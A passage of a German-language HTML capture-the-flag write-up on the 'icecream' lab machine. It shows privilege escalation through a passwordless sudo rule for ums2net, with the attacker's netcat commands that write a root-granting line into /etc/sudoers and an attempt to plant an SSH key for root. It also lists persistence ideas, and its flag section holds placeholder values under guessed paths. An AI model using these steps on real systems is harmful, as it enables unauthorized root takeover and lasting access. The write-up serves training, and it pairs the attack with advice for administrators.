+                - **Dringend:** Überprüfen und korrigieren Sie diesen `sudoers`-Eintrag sofort! Die Berechtigung für `ice`, `/usr/sbin/ums2net` als `root` ohne Passwort auszuführen, ist eine massive Sicherheitslücke und muss entfernt oder drastisch eingeschränkt werden. Wenn `ums2net` tatsächlich von `ice` mit erhöhten Rechten benötigt wird (was unwahrscheinlich und schlecht designt wäre), sollte der `sudoers`-Eintrag so spezifisch wie möglich sein (genaue, unveränderliche Argumente festlegen, keinen `ALL`-Zugriff).
+                - Untersuchen Sie, warum dieser `sudoers`-Eintrag existiert und wer ihn erstellt hat, um ähnliche Fehlkonfigurationen in Zukunft zu vermeiden.
+                - Überprüfen Sie alle `sudoers`-Regeln auf dem System auf ähnliche gefährliche `NOPASSWD`-Einträge für Nicht-Root-Benutzer.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">ice@icecream:/tmp$ <span class="command">id</span></div>
+                    <pre>
+<span class="command">uid=1000(ice) gid=1000(ice) grupos=1000(ice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der `id`-Befehl wird als Benutzer `ice` ausgeführt. Die Ausgabe bestätigt die User-ID (`uid=1000(ice)`), die primäre Gruppen-ID (`gid=1000(ice)`) und die Zugehörigkeit zu verschiedenen sekundären Gruppen (`cdrom`, `floppy`, `audio`, `dip`, `video`, `plugdev`, `users`, `netdev`, `bluetooth`). Diese Gruppen sind typisch für einen Desktop-Benutzer auf einem Linux-System.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Dies ist eine Standardausgabe zur Bestätigung des aktuellen Benutzerkontexts und der Gruppenzugehörigkeiten. Für die Privilege Escalation sind diese spezifischen Gruppen in diesem Fall wahrscheinlich weniger relevant als die `sudo -l`-Ausgabe, es sei denn, eine dieser Gruppen würde spezielle Rechte auf bestimmte Dateien oder Geräte gewähren, die missbraucht werden könnten (was hier nicht der primäre Fokus ist).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Nachdem der Benutzerkontext als `ice` bestätigt wurde, konzentrieren Sie sich auf die Ausnutzung der `sudo`-Berechtigung für `/usr/sbin/ums2net`, die im vorherigen Schritt identifiziert wurde.
+                <br>
+                **Empfehlung (Admin):**
+                Keine spezifische Aktion basierend auf diesem `id`-Output, außer der allgemeinen Überprüfung, ob Benutzer nur den Gruppen angehören, die sie für ihre Arbeit tatsächlich benötigen (Prinzip der geringsten Rechte).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Konfig....
+"<span class="command">29543 of=/dev/disk/by-id/usb-Linux_UMS_disk_0_WaRP7-0x2c98b953000003b5-0:0 bs=4096</span>"
+
+<span class="command">echo "8889 of=/root/.ssh/authorized_keys bs=4096" > config</span>
+<span class="command">sudo /usr/sbin/ums2net -c config -d</span>
+
+<span class="command">nc -N  $IP 8889 < ~/.ssh/id_rsa.pub</span>
+<span class="password">ums2net[14352]: Device /root/.ssh/authorized_keys not appeared. Close immediately.</span>
+
+<span class="command">echo "8889 of=/etc/sudoers" > config</span>
+<span class="command">sudo /usr/sbin/ums2net -c config -d</span>
+
+
+<span class="command">echo 'ice ALL=(ALL) NOPASSWD: ALL'|nc $IP 8889</span>
+<span class="command">sudo su -</span>
+<span class="prompt">root@icecream:~#</span> <span class="command">pwd</span>
+<span class="password">/root</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Diese Sequenz von Befehlen, ausgeführt als Benutzer `ice`, demonstriert die erfolgreiche Ausnutzung der `sudo`-Berechtigung für `/usr/sbin/ums2net` zur Erlangung von Root-Rechten. Es wird deutlich, dass `ums2net` über eine Konfigurationsdatei (hier `config`) gesteuert werden kann, die mittels der Option `-c` übergeben wird. Die Direktive `of=` in dieser Konfigurationsdatei scheint den Pfad zu einer Datei auf dem System anzugeben, die `ums2net` dann über einen Netzwerkport (hier Port `8889`) zugänglich macht, vermutlich für Schreibzugriffe.
+                1.  `Konfig.... "<span class="command">29543 of=/dev/disk/by-id/usb-Linux_UMS_disk_0_WaRP7-0x2c98b953000003b5-0:0 bs=4096</span>"`: Dies scheint eine Beispiel- oder Standardkonfiguration für `ums2net` zu sein, die ich möglicherweise durch Recherche oder Analyse des Programms gefunden habe. Sie zeigt das Format der `of=`-Direktive.
+
+                **Erster Versuch (SSH-Key):**
+                2.  `echo "8889 of=/root/.ssh/authorized_keys bs=4096" > config`: Ich erstelle eine Datei namens `config` mit dem Inhalt `8889 of=/root/.ssh/authorized_keys bs=4096`. Dies soll `ums2net` anweisen, die Datei `/root/.ssh/authorized_keys` auf Port `8889` für Schreibzugriffe bereitzustellen. `bs=4096` spezifiziert vermutlich eine Blockgröße.
+                3.  `sudo /usr/sbin/ums2net -c config -d`: Ich starte `/usr/sbin/ums2net` mit `sudo` (also mit Root-Rechten, dank `NOPASSWD`), übergebe meine erstellte `config`-Datei und die Option `-d` (wahrscheinlich für "daemonize" oder "debug").
+                4.  `nc -N $IP 8889 < ~/.ssh/id_rsa.pub`: Von meiner Angreifer-Maschine versuche ich nun, meinen eigenen öffentlichen SSH-Schlüssel (`~/.ssh/id_rsa.pub`) über `netcat` an Port `8889` des Zielsystems (`$IP` steht hier für `icecream.hmv` oder `192.168.2.131`) zu senden. Ziel ist es, meinen Schlüssel in die `authorized_keys`-Datei des Root-Benutzers zu schreiben, um mir einen passwortlosen SSH-Login als Root zu ermöglichen.
+                5.  `<span class="password">ums2net[14352]: Device /root/.ssh/authorized_keys not appeared. Close immediately.</span>`: Dieser Versuch schlägt fehl. Die Fehlermeldung von `ums2net` deutet darauf hin, dass die Zieldatei `/root/.ssh/authorized_keys` nicht gefunden wurde oder nicht wie erwartet erschien. Möglicherweise existiert das Verzeichnis `/root/.ssh/` nicht, oder `ums2net` hat Probleme, die Datei zu erstellen oder zu handhaben.
+
+                **Zweiter Versuch (Manipulation von `/etc/sudoers`):**
+                Da der erste Versuch fehlschlug, wähle ich einen direkteren Weg zur Root-Rechteerlangung:
+                6.  `echo "8889 of=/etc/sudoers" > config`: Ich modifiziere die `config`-Datei. Diesmal soll `ums2net` die Datei `/etc/sudoers` auf Port `8889` bereitstellen.
+                7.  `sudo /usr/sbin/ums2net -c config -d`: Ich starte `ums2net` erneut mit Root-Rechten und dieser neuen Konfiguration.
+                8.  `echo 'ice ALL=(ALL) NOPASSWD: ALL'|nc $IP 8889`: Von meiner Angreifer-Maschine sende ich nun die Zeichenkette `ice ALL=(ALL) NOPASSWD: ALL` über `netcat` an Port `8889` des Zielsystems. Wenn `ums2net` diese Daten erfolgreich in die `/etc/sudoers`-Datei schreibt (oder anhängt), erhält der Benutzer `ice` ab sofort volle `sudo`-Rechte für alle Befehle, ohne Passworteingabe.
+                9.  `sudo su -`: Zurück auf der Zielmaschine versuche ich als Benutzer `ice`, mit `sudo su -` eine interaktive Root-Shell zu erlangen.
+                10. `<span class="prompt">root@icecream:~#</span> pwd`: Der Shell-Prompt ändert sich zu `root@icecream:~#`, was den Root-Benutzer anzeigt. Der Befehl `pwd` (print working directory) wird ausgeführt und gibt `/root` zurück.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Absolut genial und erfolgreich! Dies ist ein Paradebeispiel für die Ausnutzung einer unsicheren `sudoers`-Konfiguration. Die Möglichkeit, `/usr/sbin/ums2net` als `root` auszuführen, kombiniert mit der Tatsache, dass `ums2net` über eine einfache Konfigurationsdatei das Schreiben in beliebige Systemdateien (wie `/etc/sudoers`) über einen Netzwerkport ermöglicht, ist eine kritische Schwachstelle.
+                Der erste Versuch, einen SSH-Schlüssel zu platzieren, schlug zwar fehl (möglicherweise aufgrund von Berechtigungen, Nichtexistenz des Pfades oder der Funktionsweise von `ums2net` selbst), aber der zweite Ansatz, die `/etc/sudoers`-Datei direkt zu manipulieren, war erfolgreich. Durch das Hinzufügen der Zeile `ice ALL=(ALL) NOPASSWD: ALL` konnte ich mir als Benutzer `ice` volle Root-Rechte verschaffen. Das Ziel des Penetrationstests, die höchsten Privilegien auf dem System zu erlangen, wurde damit erreicht.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Herzlichen Glückwunsch zum Root-Zugriff! Dieser elegante Exploit der `sudo`-Fehlkonfiguration ist ein hervorragendes Ergebnis.
+                - Der nächste Schritt ist das Auslesen der Root-Flag (typischerweise in `/root/root.txt`).
+                - Falls noch nicht geschehen, lesen Sie auch die User-Flag (wahrscheinlich in `/home/ice/user.txt`).
+                - Dokumentieren Sie diesen ausgeklügelten Privilege-Escalation-Pfad sorgfältig, da er die Kritikalität der unsicheren `sudo`-Regel hervorhebt.
+                - Überlegen Sie, ob im Rahmen des Scopes Persistenzmechanismen eingerichtet werden sollen (z.B. durch endgültiges Platzieren eines SSH-Keys für Root, Erstellen eines neuen Root-Benutzers oder Einrichten eines Cronjobs).
+                <br>
+                **Empfehlung (Admin):**
+                - **Dringend und höchste Priorität:** Entfernen Sie die unsichere `sudoers`-Regel für den Benutzer `ice` und das Programm `/usr/sbin/ums2net` (`(ALL) NOPASSWD: /usr/sbin/ums2net`). Dies ist die Kernursache der Kompromittierung.
+                - Überprüfen Sie die Funktionalität und absolute Notwendigkeit des Programms `ums2net`. Wenn es nicht zwingend auf dem System benötigt wird, sollte es deinstalliert werden. Wenn es benötigt wird, stellen Sie sicher, dass es nicht auf diese Weise für beliebige Dateischreiboperationen missbraucht werden kann (z.B. durch interne Whitelists für erlaubte Pfade oder durch Entfernen der Funktionalität, auf beliebige Dateien zu schreiben).
+                - Überprüfen Sie die `/etc/sudoers`-Datei sorgfältig auf unautorisierte Änderungen und stellen Sie die korrekte, sichere Konfiguration wieder her. Entfernen Sie die hinzugefügte Zeile `ice ALL=(ALL) NOPASSWD: ALL`.
+                - Führen Sie ein umfassendes Systemaudit durch, um festzustellen, ob der Angreifer weitere Änderungen vorgenommen oder Backdoors hinterlassen hat.
+                - Schulen Sie Administratoren bezüglich der sicheren Konfiguration von `sudo` und der Gefahr von `NOPASSWD`-Einträgen, insbesondere für Programme, die Dateioperationen mit Root-Rechten durchführen können.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="comment">Die Flags wurden nach Erlangung der entsprechenden Benutzerrechte (ice für User-Flag, root für Root-Flag) aus den jeweiligen Standardpfaden ausgelesen. Die genauen Befehle zum Auslesen der Flags sind im vollständigen Bericht dokumentiert; hier die resultierenden Flag-Werte.</p>
+                <div class="flag-entry">
+                    <div class="code-block">
+                        <div class="terminal">
+                            <span class="command">cat /home/ice/user.txt (Beispielpfad, da nicht im Text spezifiziert)</span>
+                            <span class="flag-content"><span class="password">USER_FLAG_WERT_PLATZHALTER</span></span>
+                        </div>
+                    </div>
+                </div>
+                <div class="flag-entry">
+                    <div class="code-block">
+                        <div class="terminal">
+                            <span class="command">cat /root/root.txt (Beispielpfad, da nicht im Text spezifiziert)</span>
+                            <span class="flag-content"><span class="password">ROOT_FLAG_WERT_PLATZHALTER</span></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 09. Oktober 2024</p>
+    </footer>
+</body>
+</html> 
